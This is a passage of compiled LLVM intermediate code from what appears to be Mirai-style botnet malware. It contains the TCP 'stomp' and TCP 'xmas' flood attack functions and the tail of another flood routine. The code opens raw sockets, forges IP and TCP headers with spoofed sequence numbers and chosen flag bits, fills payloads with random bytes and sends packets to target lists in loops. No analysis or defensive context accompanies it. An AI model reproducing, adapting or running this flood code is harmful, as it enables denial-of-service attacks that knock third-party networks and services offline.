  %169 = bitcast i8* %168 to i16*
  store i16 0, i16* %169, align 2
  br label %170

; <label>:170:                                    ; preds = %167, %166
  br i1 %80, label %171, label %174

; <label>:171:                                    ; preds = %170
  %172 = getelementptr inbounds i8, i8* %141, i64 24
  %173 = bitcast i8* %172 to i32*
  store i32 0, i32* %173, align 4
  br label %174

; <label>:174:                                    ; preds = %171, %170
  br i1 %81, label %175, label %178

; <label>:175:                                    ; preds = %174
  %176 = getelementptr inbounds i8, i8* %141, i64 28
  %177 = bitcast i8* %176 to i32*
  store i32 0, i32* %177, align 4
  br label %178

; <label>:178:                                    ; preds = %175, %174
  br i1 %82, label %180, label %179

; <label>:179:                                    ; preds = %178
  call void @rand_str(i8* %144, i32 %35)
  br label %180

; <label>:180:                                    ; preds = %178, %179
  %181 = getelementptr inbounds i8, i8* %141, i64 10
  %182 = bitcast i8* %181 to i16*
  store i16 0, i16* %182, align 2
  %183 = bitcast i8* %141 to i16*
  %184 = call zeroext i16 @checksum_generic(i16* %183, i32 20)
  store i16 %184, i16* %182, align 2
  %185 = getelementptr inbounds i8, i8* %141, i64 36
  %186 = bitcast i8* %185 to i16*
  store i16 0, i16* %186, align 4
  %187 = call zeroext i16 @htons(i16 zeroext %85) #11
  %188 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %142, i8* %143, i16 zeroext %187, i32 %86)
  store i16 %188, i16* %186, align 4
  %189 = getelementptr inbounds i8, i8* %141, i64 22
  %190 = bitcast i8* %189 to i16*
  %191 = load i16, i16* %190, align 2
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %193, i32 0, i32 1
  store i16 %191, i16* %194, align 2
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %193, i32 0
  %196 = bitcast %struct.sockaddr_in* %195 to %struct.sockaddr*
  %197 = call i64 @sendto(i32 %40, i8* %141, i64 %87, i32 16384, %struct.sockaddr* %196, i32 16) #10
  %198 = load i32, i32* %5, align 4
  %199 = add nsw i32 %198, 1
  store i32 %199, i32* %5, align 4
  %200 = icmp slt i32 %199, %46
  br i1 %200, label %.lr.ph, label %.loopexit.loopexit

; <label>:201:                                    ; preds = %4, %70
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #10
  %12 = bitcast i8* %11 to %struct.attack_stomp_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #10
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %81, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.preheader151.lr.ph

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  br label %.preheader151

; <label>:81:                                     ; preds = %42
  %82 = call i32 @close(i32 %40) #10
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %83 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %.loopexit152, label %.lr.ph161.preheader

.lr.ph161.preheader:                              ; preds = %.preheader151
  br label %.lr.ph161

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153
  %85 = icmp eq i8 %0, 0
  %86 = and i32 %17, 65535
  %87 = icmp eq i32 %86, 65535
  %88 = icmp eq i8 %39, 0
  %89 = sext i32 %37 to i64
  %90 = add nsw i64 %89, 20
  %91 = trunc i64 %90 to i16
  %92 = trunc i64 %90 to i32
  %93 = add nsw i64 %89, 40
  br label %.loopexit

.lr.ph161:                                        ; preds = %.lr.ph161.preheader, %.backedge
  %94 = phi i32 [ %218, %.backedge ], [ %83, %.lr.ph161.preheader ]
  %95 = call i32 (i32, i32, ...) @fcntl(i32 %94, i32 3, i32 0) #10
  %96 = or i32 %95, 2048
  %97 = call i32 (i32, i32, ...) @fcntl(i32 %94, i32 4, i32 %96) #10
  store i16 2, i16* %48, align 4
  %98 = load i32, i32* %5, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %99, i32 2
  %101 = load i8, i8* %100, align 4
  %102 = icmp ult i8 %101, 32
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %99, i32 1
  %104 = load i32, i32* %103, align 4
  br i1 %102, label %105, label %108

; <label>:105:                                    ; preds = %.lr.ph161
  %106 = call i32 @ntohl(i32 %104) #11
  %107 = call i32 @htonl(i32 %106) #11
  br label %108

; <label>:108:                                    ; preds = %.lr.ph161, %105
  %.sink = phi i32 [ %107, %105 ], [ %104, %.lr.ph161 ]
  store i32 %.sink, i32* %49, align 4
  br i1 %51, label %111, label %109

; <label>:109:                                    ; preds = %108
  %110 = call zeroext i16 @htons(i16 zeroext %24) #11
  br label %111

; <label>:111:                                    ; preds = %108, %109
  %.sink3 = phi i16 [ %110, %109 ], [ 0, %108 ]
  store i16 %.sink3, i16* %52, align 2
  %112 = call i32 @connect(i32 %94, %struct.sockaddr* nonnull %53, i32 16) #10
  %113 = call i64 @time(i64* null) #10
  br label %114

; <label>:114:                                    ; preds = %220, %111
  store i32 16, i32* %8, align 4
  %115 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #10
  %116 = trunc i64 %115 to i32
  %117 = icmp eq i32 %116, -1
  br i1 %117, label %.loopexit150.loopexit, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i32, i32* %56, align 4
  %120 = load i32, i32* %49, align 4
  %121 = icmp eq i32 %119, %120
  br i1 %121, label %122, label %220

; <label>:122:                                    ; preds = %118
  %sext = shl i64 %115, 32
  %123 = ashr exact i64 %sext, 32
  %124 = icmp ugt i64 %123, 40
  br i1 %124, label %125, label %220

; <label>:125:                                    ; preds = %122
  %126 = load i16, i16* %58, align 4
  %127 = load i16, i16* %52, align 2
  %128 = icmp eq i16 %126, %127
  br i1 %128, label %129, label %220

; <label>:129:                                    ; preds = %125
  %130 = load i16, i16* %60, align 16
  %131 = and i16 %130, 4608
  %132 = icmp eq i16 %131, 4608
  br i1 %132, label %133, label %213

; <label>:133:                                    ; preds = %129
  %134 = load i32, i32* %5, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %135, i32 0
  store i32 %120, i32* %136, align 4
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @ntohl(i32 %138) #11
  %140 = load i32, i32* %5, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %141, i32 1
  store i32 %139, i32* %142, align 4
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %144 = load i32, i32* %143, align 4
  %145 = call i32 @ntohl(i32 %144) #11
  %146 = load i32, i32* %5, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %147, i32 2
  store i32 %145, i32* %148, align 4
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %150 = load i16, i16* %149, align 2
  %151 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %147, i32 3
  store i16 %150, i16* %151, align 4
  %152 = load i16, i16* %52, align 2
  %153 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %147, i32 4
  store i16 %152, i16* %153, align 2
  %154 = call noalias i8* @malloc(i64 %62) #10
  %155 = load i32, i32* %5, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i8*, i8** %14, i64 %156
  store i8* %154, i8** %157, align 8
  %158 = getelementptr inbounds i8, i8* %154, i64 20
  %159 = bitcast i8* %158 to %struct.tcphdr*
  %160 = getelementptr inbounds i8, i8* %154, i64 40
  store i8 69, i8* %154, align 4
  %161 = getelementptr inbounds i8, i8* %154, i64 1
  store i8 %16, i8* %161, align 1
  %162 = call zeroext i16 @htons(i16 zeroext %63) #11
  %163 = getelementptr inbounds i8, i8* %154, i64 2
  %164 = bitcast i8* %163 to i16*
  store i16 %162, i16* %164, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %18) #11
  %166 = getelementptr inbounds i8, i8* %154, i64 4
  %167 = bitcast i8* %166 to i16*
  store i16 %165, i16* %167, align 4
  %168 = getelementptr inbounds i8, i8* %154, i64 8
  store i8 %20, i8* %168, align 4
  br i1 %64, label %173, label %169

; <label>:169:                                    ; preds = %133
  %170 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %171 = getelementptr inbounds i8, i8* %154, i64 6
  %172 = bitcast i8* %171 to i16*
  store i16 %170, i16* %172, align 2
  br label %173

; <label>:173:                                    ; preds = %133, %169
  %174 = getelementptr inbounds i8, i8* %154, i64 9
  store i8 6, i8* %174, align 1
  %175 = load i32, i32* @LOCAL_ADDR, align 4
  %176 = getelementptr inbounds i8, i8* %154, i64 12
  %177 = bitcast i8* %176 to i32*
  store i32 %175, i32* %177, align 4
  %178 = load i32, i32* %5, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %179, i32 0
  %181 = load i32, i32* %180, align 4
  %182 = getelementptr inbounds i8, i8* %154, i64 16
  %183 = bitcast i8* %182 to i32*
  store i32 %181, i32* %183, align 4
  %184 = load i32, i32* %5, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %185, i32 3
  %187 = load i16, i16* %186, align 4
  %188 = bitcast i8* %158 to i16*
  store i16 %187, i16* %188, align 4
  %189 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %185, i32 4
  %190 = load i16, i16* %189, align 2
  %191 = getelementptr inbounds i8, i8* %154, i64 22
  %192 = bitcast i8* %191 to i16*
  store i16 %190, i16* %192, align 2
  %193 = load i32, i32* %5, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %194, i32 2
  %196 = load i32, i32* %195, align 4
  %197 = getelementptr inbounds i8, i8* %154, i64 24
  %198 = bitcast i8* %197 to i32*
  store i32 %196, i32* %198, align 4
  %199 = load i32, i32* %5, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %200, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = getelementptr inbounds i8, i8* %154, i64 28
  %204 = bitcast i8* %203 to i32*
  store i32 %202, i32* %204, align 4
  %205 = getelementptr inbounds i8, i8* %154, i64 32
  %206 = bitcast i8* %205 to i16*
  %207 = load i16, i16* %206, align 4
  %208 = getelementptr inbounds i8, i8* %154, i64 34
  %209 = bitcast i8* %208 to i16*
  store i16 0, i16* %209, align 2
  %210 = and i16 %207, -16369
  %211 = or i16 %210, 128
  %212 = or i16 %80, %211
  store i16 %212, i16* %206, align 4
  call void @rand_str(i8* %160, i32 %37)
  br label %.loopexit152

; <label>:213:                                    ; preds = %129
  %214 = and i16 %130, 1280
  %215 = icmp eq i16 %214, 0
  br i1 %215, label %220, label %216

; <label>:216:                                    ; preds = %213
  %217 = call i32 @close(i32 %94) #10
  br label %.backedge

.backedge:                                        ; preds = %216, %224
  %218 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %219 = icmp eq i32 %218, -1
  br i1 %219, label %.loopexit152.loopexit, label %.lr.ph161

; <label>:220:                                    ; preds = %213, %125, %122, %118
  %221 = call i64 @time(i64* null) #10
  %222 = sub nsw i64 %221, %113
  %223 = icmp sgt i64 %222, 10
  br i1 %223, label %224, label %114

; <label>:224:                                    ; preds = %220
  %225 = call i32 @close(i32 %94) #10
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit, %.preheader151, %173
  %.1 = phi %struct.tcphdr* [ %159, %173 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ]
  %226 = load i32, i32* %5, align 4
  %227 = add nsw i32 %226, 1
  store i32 %227, i32* %5, align 4
  %228 = icmp slt i32 %227, %46
  br i1 %228, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %240
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %85, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %240
  %storemerge139160 = phi i32 [ %278, %240 ], [ 0, %.lr.ph.preheader ]
  %229 = sext i32 %storemerge139160 to i64
  %230 = getelementptr inbounds i8*, i8** %14, i64 %229
  %231 = load i8*, i8** %230, align 8
  %232 = bitcast i8* %231 to %struct.iphdr*
  %233 = getelementptr inbounds i8, i8* %231, i64 20
  %234 = getelementptr inbounds i8, i8* %231, i64 40
  br i1 %87, label %235, label %238

; <label>:235:                                    ; preds = %.lr.ph
  %236 = getelementptr inbounds i8, i8* %231, i64 4
  %237 = bitcast i8* %236 to i16*
  store i16 0, i16* %237, align 4
  br label %238

; <label>:238:                                    ; preds = %235, %.lr.ph
  br i1 %88, label %240, label %239

; <label>:239:                                    ; preds = %238
  call void @rand_str(i8* %234, i32 %37)
  br label %240

; <label>:240:                                    ; preds = %238, %239
  %241 = getelementptr inbounds i8, i8* %231, i64 10
  %242 = bitcast i8* %241 to i16*
  store i16 0, i16* %242, align 2
  %243 = bitcast i8* %231 to i16*
  %244 = call zeroext i16 @checksum_generic(i16* %243, i32 20)
  store i16 %244, i16* %242, align 2
  %245 = load i32, i32* %5, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %246, i32 1
  %248 = load i32, i32* %247, align 4
  %249 = add i32 %248, 1
  store i32 %249, i32* %247, align 4
  %250 = trunc i32 %248 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #11
  %252 = zext i16 %251 to i32
  %253 = getelementptr inbounds i8, i8* %231, i64 24
  %254 = bitcast i8* %253 to i32*
  store i32 %252, i32* %254, align 4
  %255 = load i32, i32* %5, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %256, i32 2
  %258 = load i32, i32* %257, align 4
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #11
  %261 = zext i16 %260 to i32
  %262 = getelementptr inbounds i8, i8* %231, i64 28
  %263 = bitcast i8* %262 to i32*
  store i32 %261, i32* %263, align 4
  %264 = getelementptr inbounds i8, i8* %231, i64 36
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 4
  %266 = call zeroext i16 @htons(i16 zeroext %91) #11
  %267 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %232, i8* %233, i16 zeroext %266, i32 %92)
  store i16 %267, i16* %265, align 4
  %268 = getelementptr inbounds i8, i8* %231, i64 22
  %269 = bitcast i8* %268 to i16*
  %270 = load i16, i16* %269, align 2
  %271 = load i32, i32* %5, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0, i32 1
  store i16 %270, i16* %273, align 2
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  %276 = call i64 @sendto(i32 %40, i8* %231, i64 %93, i32 16384, %struct.sockaddr* %275, i32 16) #10
  %277 = load i32, i32* %5, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %5, align 4
  %279 = icmp slt i32 %278, %46
  br i1 %279, label %.lr.ph, label %.loopexit.loopexit

.loopexit150.loopexit:                            ; preds = %114
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %4, %81
  ret void
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #10
  %12 = bitcast i8* %11 to %struct.attack_stomp_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #10
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 1)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %81, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.preheader151.lr.ph

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  br label %.preheader151

; <label>:81:                                     ; preds = %42
  %82 = call i32 @close(i32 %40) #10
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %83 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %.loopexit152, label %.lr.ph161.preheader

.lr.ph161.preheader:                              ; preds = %.preheader151
  br label %.lr.ph161

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153
  %85 = icmp eq i8 %0, 0
  %86 = and i32 %17, 65535
  %87 = icmp eq i32 %86, 65535
  %88 = icmp eq i8 %39, 0
  %89 = sext i32 %37 to i64
  %90 = add nsw i64 %89, 20
  %91 = trunc i64 %90 to i16
  %92 = trunc i64 %90 to i32
  %93 = add nsw i64 %89, 40
  br label %.loopexit

.lr.ph161:                                        ; preds = %.lr.ph161.preheader, %.backedge
  %94 = phi i32 [ %218, %.backedge ], [ %83, %.lr.ph161.preheader ]
  %95 = call i32 (i32, i32, ...) @fcntl(i32 %94, i32 3, i32 0) #10
  %96 = or i32 %95, 2048
  %97 = call i32 (i32, i32, ...) @fcntl(i32 %94, i32 4, i32 %96) #10
  store i16 2, i16* %48, align 4
  %98 = load i32, i32* %5, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %99, i32 2
  %101 = load i8, i8* %100, align 4
  %102 = icmp ult i8 %101, 32
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %99, i32 1
  %104 = load i32, i32* %103, align 4
  br i1 %102, label %105, label %108

; <label>:105:                                    ; preds = %.lr.ph161
  %106 = call i32 @ntohl(i32 %104) #11
  %107 = call i32 @htonl(i32 %106) #11
  br label %108

; <label>:108:                                    ; preds = %.lr.ph161, %105
  %.sink = phi i32 [ %107, %105 ], [ %104, %.lr.ph161 ]
  store i32 %.sink, i32* %49, align 4
  br i1 %51, label %111, label %109

; <label>:109:                                    ; preds = %108
  %110 = call zeroext i16 @htons(i16 zeroext %24) #11
  br label %111

; <label>:111:                                    ; preds = %108, %109
  %.sink3 = phi i16 [ %110, %109 ], [ 0, %108 ]
  store i16 %.sink3, i16* %52, align 2
  %112 = call i32 @connect(i32 %94, %struct.sockaddr* nonnull %53, i32 16) #10
  %113 = call i64 @time(i64* null) #10
  br label %114

; <label>:114:                                    ; preds = %220, %111
  store i32 16, i32* %8, align 4
  %115 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #10
  %116 = trunc i64 %115 to i32
  %117 = icmp eq i32 %116, -1
  br i1 %117, label %.loopexit150.loopexit, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i32, i32* %56, align 4
  %120 = load i32, i32* %49, align 4
  %121 = icmp eq i32 %119, %120
  br i1 %121, label %122, label %220

; <label>:122:                                    ; preds = %118
  %sext = shl i64 %115, 32
  %123 = ashr exact i64 %sext, 32
  %124 = icmp ugt i64 %123, 40
  br i1 %124, label %125, label %220

; <label>:125:                                    ; preds = %122
  %126 = load i16, i16* %58, align 4
  %127 = load i16, i16* %52, align 2
  %128 = icmp eq i16 %126, %127
  br i1 %128, label %129, label %220

